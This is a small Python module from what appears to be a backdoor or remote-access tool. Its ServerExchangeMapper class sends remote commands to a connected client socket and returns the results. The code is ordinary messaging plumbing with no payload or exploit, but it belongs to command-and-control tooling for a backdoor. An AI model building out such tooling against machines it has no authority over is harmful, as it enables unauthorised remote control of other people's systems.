from backdoor.messages.messenger import SocketMessenger
from backdoor.models.client import ClientModel
from backdoor.models.commands import RemoteCommand, CommandResult


class ServerExchangeMapper:

    def __init__(self, messenger: SocketMessenger) -> None:
        self.messenger = messenger

    def exchange(self, client: ClientModel, command: RemoteCommand) -> CommandResult:
        self.messenger.send(client.sock, command)
        return self.messenger.receive(client.sock)
